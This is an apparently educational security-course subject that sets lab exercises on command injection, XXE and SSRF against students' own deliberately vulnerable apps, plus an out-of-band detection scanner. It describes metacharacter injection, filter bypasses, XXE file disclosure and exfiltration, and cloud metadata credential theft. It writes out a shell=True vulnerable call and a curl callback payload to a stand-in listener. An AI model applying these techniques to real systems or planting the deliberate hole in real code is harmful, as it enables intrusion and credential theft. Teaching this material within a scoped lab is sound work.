---
title: "The Subject"
description: "Three vulnerability classes united by one shape: user input crosses a trust boundary into something that interprets it as instructions rather than data — …"
---
# Server-Side Injection: Command Injection, XXE and SSRF: The Subject

*Subject 5 of 7 — Security Fundamentals · Version 1.0 — September 2026*

> Three vulnerability classes united by one shape: user input crosses a trust boundary into something that interprets it as instructions rather than data — a shell, an XML parser, or the server's own outbound network stack.

## Chapter 00 — Foreword

> *SQL injection taught you the pattern. These three are the same idea wearing different clothes: a shell, a parser, and a network stack, each willing to treat your data as someone else's command.*

SQL and Database Internals covered SQL injection at parser-level depth. This subject applies the identical mental model — data crossing into syntax — to three more interpreters an application routinely hands untrusted input to: the OS shell (command injection), an XML parser with entity expansion enabled (XXE), and the application's own HTTP client acting on the server's behalf (SSRF). SSRF is the one most worth extra care, because in a cloud environment it is routinely a straight line to full infrastructure compromise via the metadata service.

## Chapter I — Introduction

You will exploit a deliberately vulnerable command-execution feature with and without a naive input filter (and prove why blocklisting shell metacharacters fails), extract local files and pivot to SSRF through XML external entities against a vulnerable XML parser, and turn a URL-fetching feature into cloud credential theft via the instance metadata service. The capstone builds a single scanner that fingerprints and probes all three classes against one target.

## Chapter II — General Instructions

**II.1** **Crash policy.** Your programs must never crash, hang indefinitely, or exit uncleanly on malformed input. Any behavior not explicitly specified is undefined behavior — free to do anything *except* crash, hang, or corrupt state.

**II.2** **Norm (code-quality baseline).** Functions do one thing and are named for what they do. No magic numbers. No block of code you cannot explain, unprompted, line by line, during defense.

**II.3** **Evidence, not assertions.** Every claim of the form "this is exploitable" or "this fix works" must be backed by a reproducible request/response, log, or capture in your turn-in.

**II.4** **Bonus rule.** Bonus parts are evaluated only if the mandatory part is 100% functional and correct.

**II.5** **Scope.** All exploitation in this subject targets DVWA, Juice Shop, WebGoat, or an application you wrote — running locally or on a VPS you own. Never a third party without written authorization.

## Chapter III — Mandatory Part

### Exercise 00 — cmdinject0

- **Turn-in dir:** serverside_injection/ex00/
- **Files:** vuln_app.py, EXPLOIT.md, evidence/
- **Allowed:** Python subprocess, your own vulnerable app
- **Forbidden:** commix or any automated command-injection tool

**Description.** A deliberately vulnerable feature that shells out to a system command with unsanitized user input (e.g. a "ping this host" diagnostic tool), exploited manually, then defeated again after a naive blocklist filter is added — proving why blocklists fail against this class specifically.

!!! success "Mandatory"

    - A vulnerable endpoint built with `subprocess.run(f"ping -c 1 {host}", shell=True)` or equivalent — `shell=True` with string-interpolated input is the deliberate bug.
    - Working exploitation via at least three separate shell-metacharacter techniques: command chaining (`;` or `&&`), command substitution (`$(...)` or backticks), and output redirection/piping — each demonstrated running an attacker-chosen command (e.g. `id`, `whoami`, reading a file) with its output captured in the application's response.
    - After adding a naive blocklist filter (stripping/rejecting `;`, `&`, `|`) to the target, demonstrate at least one working bypass — e.g. newline injection, a character the blocklist missed, or command substitution syntax the filter didn't anticipate — proving blocklisting is fundamentally reactive and incomplete.
    - Fix the vulnerability correctly: rewrite the vulnerable call using `subprocess.run([...], shell=False)` with argument-list form and strict input validation (e.g. the host argument matched against a hostname/IP regex) — and re-run your original exploits against the fixed version, captured failing.
    - A written root-cause explanation of exactly why `shell=False` with a list of arguments closes this permanently: there is no shell interpreting metacharacters at all in that call path, not merely a shell that's harder to reach.

!!! failure "Forbidden"

    - commix or any automated command-injection exploitation tool.
    - A "fix" that is just a slightly bigger blocklist — the mandatory fix must be architectural (`shell=False` + validation), with the blocklist bypass demonstrated as a separate, explicitly inadequate step.
    - Testing against any target other than your own local app.

!!! note "Norm"

    See §II.2, plus: vulnerable-call, exploit-payloads, and fixed-call each clearly separated and independently runnable.

!!! tip "Bonus"

    A blind command-injection variant (no output reflected) exploited via an out-of-band technique (e.g. triggering a DNS lookup or HTTP callback to a listener you control) to confirm execution without seeing output directly.

### Exercise 01 — xxeharvest0

- **Turn-in dir:** serverside_injection/ex01/
- **Files:** vuln_app.py, EXPLOIT.md, evidence/
- **Allowed:** a Python/Java XML parser configured (insecurely, deliberately) with external entity resolution enabled
- **Forbidden:** any automated XXE-exploitation tool

**Description.** A deliberately vulnerable XML-accepting endpoint (e.g. a file-upload feature parsing an XML manifest) exploited for local file disclosure via classic XXE, then extended into SSRF via XXE's external-entity URL-fetching capability.

!!! success "Mandatory"

    - A vulnerable endpoint parsing user-supplied XML with a parser configured to resolve external entities (e.g. `lxml` with `resolve_entities=True` and no `DTD` restriction, or an equivalently misconfigured Java `DocumentBuilderFactory`) — the specific insecure configuration flag must be identified in your writeup.
    - Classic file-disclosure XXE: a crafted XML payload defining an external entity pointing at a local file (e.g. `/etc/passwd` or a planted secret file) that gets read into the parsed document and reflected back in the response.
    - Blind/out-of-band XXE: for a case where the response is not reflected, demonstrate exfiltrating file contents via an out-of-band channel (an external entity that triggers a request to a listener you control, carrying the file contents in the request — e.g. via a parameter-entity technique).
    - XXE-to-SSRF: a payload whose external entity URL points not at a local file but at an internal-only or otherwise interesting network resource (e.g. an internal service on localhost, or — foreshadowing Exercise 02 — the cloud metadata endpoint if your lab environment has one), demonstrating that XXE is also a network-request-forgery primitive, not only a file-read primitive.
    - The correct fix applied and verified: disabling external entity resolution and DTD processing entirely at the parser configuration level (not filtering payload content), with your original exploits re-run and shown failing.

!!! failure "Forbidden"

    - Any automated XXE tool.
    - A fix that filters payload strings (blocking the word "ENTITY") instead of disabling the parser feature at the configuration level.
    - Skipping the blind/OOB variant — many real-world XXE bugs are blind, and the technique is specifically assessed.

!!! note "Norm"

    See §II.2, plus: the vulnerable parser configuration isolated in one clearly-labeled function so the fix is a one-line, defensible diff.

!!! tip "Bonus"

    Billion-laughs-style entity-expansion denial-of-service demonstrated (and explicitly not left running against anything but your own throwaway instance), with a note on why disabling external entities alone doesn't stop this variant — internal entity expansion limits are a separate control.

### Exercise 02 — ssrfmeta0

- **Turn-in dir:** serverside_injection/ex02/
- **Files:** vuln_app.py, EXPLOIT.md, evidence/
- **Allowed:** a URL-fetching feature you build, a simulated or real cloud metadata endpoint in your lab
- **Forbidden:** any automated SSRF scanner

**Description.** A deliberately vulnerable "fetch this URL and show me a preview" feature (a common real-world SSRF source: image proxies, webhook validators, PDF-from-URL generators) exploited to reach internal-only resources, culminating in reading a simulated cloud instance-metadata endpoint for credentials.

!!! success "Mandatory"

    - A vulnerable endpoint that server-side-fetches an attacker-supplied URL (e.g. to generate a link preview) with no restriction on destination.
    - Demonstrate reaching an internal-only service that is not reachable from the public internet but is reachable from the server itself (e.g. an internal admin service you stand up on `localhost` or an internal-only Docker network) — proving SSRF's core value to an attacker: it borrows the server's network position.
    - Demonstrate reaching a simulated cloud instance-metadata endpoint (stand up a minimal local HTTP server on `169.254.169.254` — routable via a lab network namespace/route — or a faithful stand-in on localhost mimicking the same response shape) and extracting simulated temporary credentials from it, with a written explanation of why this endpoint is unauthenticated by design in real cloud environments (it's meant to be reachable only from the instance itself) and exactly why that design assumption is what SSRF breaks.
    - Demonstrate at least one SSRF-filter bypass technique against a naive defense (e.g. a blocklist on the string "169.254.169.254" bypassed via a decimal/hex IP representation, a DNS name that resolves to the internal IP, or a redirect chain landing on the blocked address after the filter's initial check passed) — proving, as with command injection, that input-side blocklisting is the wrong layer of defense.
    - The correct fix applied and verified: an allowlist of permitted destination schemes/hosts (not a denylist), enforced by actually resolving and checking the destination IP against private/link-local ranges at request time (not just string-matching the URL) — with your bypasses re-run and shown failing.

!!! failure "Forbidden"

    - Any automated SSRF-scanning tool.
    - Targeting a real cloud provider's actual metadata endpoint from anywhere other than an instance you provisioned yourself for this exercise.
    - A "fix" that blocklists specific strings/IPs instead of allowlisting permitted destinations and validating the resolved IP.

!!! note "Norm"

    See §II.2, plus: URL validation, DNS resolution, and the actual fetch each in their own function, so the allowlist fix is inserted at exactly the right point (after resolution, before the fetch — never trusting the pre-resolution hostname alone).

!!! tip "Bonus"

    Demonstrate a DNS-rebinding SSRF bypass: a hostname that resolves to a safe IP at validation time and a forbidden internal IP at fetch time (a TOCTOU race), tying directly back to the DNS-rebinding lab in Networking Depth.

## Chapter IV — Capstone

!!! info "How this capstone forces everything together"

    **This exercise forces together** all three injection classes' distinct payload shapes and confirmation techniques, plus a single shared idea that makes the tool coherent rather than three unrelated modules bolted together: out-of-band (OOB) confirmation. A blind command injection, a blind XXE, and an SSRF are all confirmed the same way in real engagements — by getting the target to reach back to infrastructure you control — and building one OOB listener and reusing it across all three probe types is the actual synthesis this capstone requires, not just running three separate exercises' code back to back.

### Capstone — injecttriage

- **Turn-in dir:** serverside_injection/capstone/
- **Files:** src/, README.md, evidence/
- **Grading:** mandatory-only; bonus per §II.7

**Description.** A single scanner that, given a target application's endpoints, probes for command injection, XXE, and SSRF using safe, non-destructive out-of-band canary techniques for all three — confirming exploitability through a listener you control rather than causing real damage, the way a responsible engagement actually operates.

!!! success "Mandatory"

    - A single OOB listener (a minimal DNS and/or HTTP server you run, reusing your Networking Depth `dnsresolve0`/socket experience) that logs every inbound callback with a unique per-probe token, so a hit can be traced back to exactly which probe triggered it.
    - Command-injection module: for each target parameter, injects an OOB-callback payload (e.g. `; curl http://TOKEN.your-listener/`) using multiple metacharacter techniques from Exercise 00, and reports a finding only when the corresponding token is actually observed at the listener — not merely on a suspicious response.
    - XXE module: for each XML-accepting endpoint, injects an OOB external-entity payload (both direct and blind/parameter-entity variants from Exercise 01) and reports a finding only on a confirmed listener hit.
    - SSRF module: for each URL-accepting parameter, submits your listener's own URL as the target and confirms the finding via an inbound hit, then — only for confirmed-vulnerable endpoints — separately attempts the internal-resource and metadata-endpoint reachability tests from Exercise 02 against your own lab targets.
    - One consolidated report: per finding, the injection class, the exact payload, the OOB token and timestamp of the confirming callback, and severity (SSRF reaching metadata &gt; SSRF reaching only internal services &gt; blind confirmation only &gt; no confirmation).
    - Demonstrated end to end against your own Exercise 00/01/02 vulnerable targets, correctly confirming each via the shared OOB listener, plus a clean/fixed target set showing zero false positives.

!!! failure "Forbidden"

    - commix, any XXE tool, or any SSRF scanner doing the probing for you.
    - Reporting a finding based on response-content heuristics alone without an actual OOB confirmation — this produces exactly the false-positive noise that gets AppSec tools ignored.
    - A shared listener that can't disambiguate which probe triggered which callback (no per-probe token) — this makes the report unusable for triage.

!!! note "Norm"

    See §II.2, plus: the OOB listener is one shared module used by all three probe modules, not three separate listeners; token generation/tracking centralized.

!!! tip "Bonus (§II.7)"

    Extend the SSRF module with automatic cloud-provider fingerprinting (AWS vs. GCP vs. Azure metadata endpoint shape) once internal reachability is confirmed, choosing the correct metadata-extraction path per provider.

## Chapter V — Submission and Peer-Evaluation

Turn in this subject as a single git repository:

```text
serverside_injection/
├── ex00/
├── ex01/
├── ex02/
└── capstone/
```

Each exercise is defended live against your own reproducible vulnerable target. The capstone is run live against a target set the evaluator selects from your three vulnerable apps plus their fixed counterparts, and is expected to distinguish between them correctly using only OOB-confirmed evidence.

## Appendix A — Evaluation Scale (Defense Guide)

> Companion to Chapter III/IV. Not part of the subject proper — this is the scale an evaluator uses. Read it as a self-test before your defense.

### A.0 — cmdinject0

**Defense questions**

1. Run your three exploitation techniques live against the vulnerable version, then show all three failing against the fixed version.
2. Show me your blocklist bypass — what specifically did the filter author fail to anticipate?
3. Why does `shell=False` with an argument list eliminate this class of bug structurally rather than just making it harder?
4. If the application genuinely needs to run a user-influenced shell pipeline (not just a single command), what's the actual safe pattern — and is there one?

### A.1 — xxeharvest0

**Defense questions**

1. Show me the exact parser configuration flag responsible for this vulnerability, and the one-line fix.
2. Walk through your blind XXE payload — trace exactly how the file contents end up leaving the server via the out-of-band channel.
3. Why is XXE fundamentally also an SSRF primitive — what do the two techniques have in common under the hood?
4. Why doesn't sanitizing the XML input (stripping suspicious strings) actually fix this the way disabling the parser feature does?

### A.2 — ssrfmeta0

**Defense questions**

1. Walk through your metadata-endpoint exploitation live and explain, precisely, why that endpoint has no authentication in real cloud environments.
2. Show your filter-bypass technique and explain why validating the URL *string* is insufficient — what has to be validated instead, and at what point in the request lifecycle?
3. Why is an allowlist structurally different from a denylist here, in the same way it was for command injection's fix?
4. Explain the DNS-rebinding variant (bonus or not) and why "validate the hostname" and "validate the IP you actually connect to" are not the same check.
5. What's the real-world blast radius difference between an SSRF that only reads local files versus one that reaches a cloud metadata endpoint?

### A.3 — Capstone: injecttriage

**Defense questions**

1. Run the full scanner live against all three of your vulnerable targets, narrating the OOB callbacks as they arrive.
2. Show me how your token scheme lets you attribute a specific callback to a specific probe when multiple probes are in flight concurrently.
3. Why is OOB confirmation specifically the right unifying technique across three otherwise-different vulnerability classes?
4. Run it against your clean/fixed targets — walk through why it correctly reports no findings.
5. What would a false positive look like for your command-injection module if it relied on response timing instead of OOB confirmation, and why did you choose not to build it that way?

**Test / edge cases**

- [ ] A target that blocks outbound DNS but allows outbound HTTP (or vice versa): the tool correctly falls back to whichever OOB channel is actually viable, or reports the constraint explicitly.
- [ ] Two probes fired close together producing near-simultaneous callbacks: tokens correctly disambiguate which is which.
- [ ] A target where the vulnerable parameter only accepts a fixed set of characters (partial input filtering): the tool reports "probed, no confirmation" rather than a false negative presented as a clean bill of health with no nuance.
- [ ] An SSRF finding that reaches an internal service but explicitly fails to reach the metadata endpoint (network-segmented lab): correctly reported at the lower severity tier, not conflated with full metadata compromise.
- [ ] A listener that receives a callback with a malformed/unexpected token (noise, e.g. from background internet scanning if publicly reachable): not mistakenly attributed to one of your probes.
- [ ] XXE OOB confirmation on a parser that blocks external DTDs but still resolves parameter entities in a different way: the module's behavior here (finds it, or explicitly documents the miss) is accurate, not falsely reassuring.
